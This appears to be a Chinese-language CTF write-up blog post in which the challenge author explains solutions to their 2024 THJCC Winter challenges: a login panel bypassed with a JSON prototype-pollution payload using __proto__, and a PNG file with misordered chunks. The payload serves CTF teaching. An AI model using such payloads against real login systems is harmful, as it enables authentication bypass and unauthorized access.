---
description: 被嗆爆了下次改進
title: 2024 THJCC WINTER writeup
pubDate: 2024-12-16 15:52:19
tags:
  -  writeup
categories:
    - Daily
image: https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTMdHnKyoWMjFsuOqjEmVIDDr-AsbtAMdCK8g&s
---

## 前言

我這次出兩題，分別是

- Web
  - Login Panel
- Misc
  - png chunk

---

## Login Panel

預期解是 prototype pollution

### sql injection

```sql
SELECT ? AS SECRET FROM users WHERE user = ? AND password = ?
```

->

```sql
SELECT ? AS SECRET FROM users WHERE user = 'admin' AND password = '1'
```

but 這樣行不通

### prototype pollution

```javascript
loginData = Object.assign({ secret }, loginData); // oh, that's cool
```

其中這邊有個 prototype pollution
Object.assign 將 secret 加入 loginData，可能導致對象原型的污染。
原先的loginData是

```json
{
  "secret": "THJCC{fake}",
  "user": "admin",
  "password": "1"
}
```

可以加入`__proto__`

只要我

```json
{
  "user": "admin",
  "__proto__": {
    "password": {
      "password": 1
    }
  }
}
```

加入 `__proto__` 的，整個 `Object.prototype.password.password` 被設為 1

那![截圖 2024-12-16 15.44.42](https://hackmd.io/_uploads/rkAO9L6Vye.png)

> FLAG : THJCC{pRoTo7YP3_Poi50ninG???}

---

## png chunk

顧名思義就是png 的區塊
用
https://www.nayuki.io/page/png-file-chunk-inspector
去看會發現
![image](https://hackmd.io/_uploads/HkXLiUTV1e.png)
IEND 和 ITAT 的位置有錯
只有把它調整過來就好
![image](https://hackmd.io/_uploads/SkM9i8aN1x.png)
![image](https://hackmd.io/_uploads/S1doo8aEyl.png)

---

## Login Panel 非預期解

![image](https://hackmd.io/_uploads/S1PznI6Nye.png)
![image](https://hackmd.io/_uploads/HJrQ286Nkl.png)

_如果您是通靈大師，那麼密碼藏在首頁_
![image](https://hackmd.io/_uploads/ByjmR86N1g.png)
~~密碼就是never gonna give you up~~
{"user":"admin","password":"https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley"}
![image](https://hackmd.io/_uploads/ry6uR8aEke.png)
🤏
